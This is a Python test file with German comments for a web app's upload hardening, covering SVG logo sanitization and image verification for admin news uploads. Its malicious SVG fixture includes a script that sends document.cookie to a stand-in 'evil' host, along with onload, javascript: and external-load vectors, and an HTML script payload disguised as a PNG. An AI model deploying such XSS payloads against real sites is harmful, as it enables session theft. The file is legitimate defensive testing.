"""Upload-Haertung: SVG-Sanitisierung (Foerderer-Logo, oeffentlich) +
Bild-Verifikation beim News-Upload (Admin)."""
import io

from conftest import eingeloggt
from PIL import Image

import foerderer


BOESES_SVG = (
    b'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" '
    b'width="10" height="10">'
    b'<script>fetch("//evil/"+document.cookie)</script>'
    b'<rect width="10" height="10" onload="alert(1)"/>'
    b'<a xlink:href="javascript:alert(2)"><text>x</text></a>'
    b'<image xlink:href="https://evil.example/p.png"/>'
    b'<style>@import url(https://evil.example/x.css)</style>'
    b'</svg>'
)
GUTES_SVG = (
    b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">'
    b'<path d="M4 4h16v16H4z" fill="#6ee87e"/></svg>'
)


def test_svg_bereinigen_entfernt_aktive_konstrukte():
    out = foerderer._svg_bereinigen(BOESES_SVG)
    assert out is not None
    for verboten in (b'<script', b'onload', b'javascript:', b'evil.example', b'@import'):
        assert verboten not in out


def test_svg_bereinigen_behaelt_gutes_logo():
    out = foerderer._svg_bereinigen(GUTES_SVG)
    assert b'<path' in out and b'6ee87e' in out


def test_svg_bereinigen_lehnt_nicht_svg_ab():
    assert foerderer._svg_bereinigen(b'<html>x</html>') is None
    assert foerderer._svg_bereinigen(b'kaputt<<<') is None


def test_logo_upload_speichert_bereinigtes_svg(client, app):
    daten = {
        'action': 'preview', 'firma': 'Testfirma GmbH',
        'beschreibung': 'x' * 30, 'kategorie': 'Technologie',
        'betrag': '50', 'email': 'chef@testfirma.de',
    }
    daten['logo'] = (io.BytesIO(BOESES_SVG), 'logo.svg')
    resp = client.post('/foerderer/antrag', data=daten,
                       content_type='multipart/form-data', follow_redirects=True)
    assert resp.status_code == 200

    import glob
    import os
    pfad = os.path.join(app.static_folder, 'uploads', 'foerderer')
    dateien = glob.glob(os.path.join(pfad, 'prev_*.svg'))
    assert dateien, 'kein Logo gespeichert -> Upload-Flow gebrochen'
    with open(max(dateien, key=os.path.getmtime), 'rb') as f:
        inhalt = f.read()
    assert b'<script' not in inhalt and b'onload' not in inhalt


def test_news_upload_lehnt_umbenannte_datei_ab(client, superadmin, monkeypatch):
    monkeypatch.setattr('admin.ip_erlaubt', lambda *a, **kw: True)
    eingeloggt(client, 'superadmin_test', 'sehr-geheim-123')

    kein_bild = (io.BytesIO(b'<html><script>alert(1)</script></html>'), 'x.png')
    resp = client.post('/admin/news', data={
        'titel': 'Test', 'inhalt': 'Inhalt', 'bild': kein_bild,
    }, content_type='multipart/form-data', follow_redirects=True)
    text = resp.get_data(as_text=True)
    assert 'Bild' in text or 'Format' in text  # abgelehnt, nicht gespeichert


def test_news_upload_akzeptiert_echtes_png(client, superadmin, monkeypatch):
    monkeypatch.setattr('admin.ip_erlaubt', lambda *a, **kw: True)
    eingeloggt(client, 'superadmin_test', 'sehr-geheim-123')

    buf = io.BytesIO()
    Image.new('RGB', (8, 8), '#6ee87e').save(buf, 'PNG')
    buf.seek(0)
    resp = client.post('/admin/news', data={
        'titel': 'Mit Bild', 'inhalt': 'Text', 'bild': (buf, 'echt.png'),
    }, content_type='multipart/form-data', follow_redirects=True)
    assert resp.status_code == 200
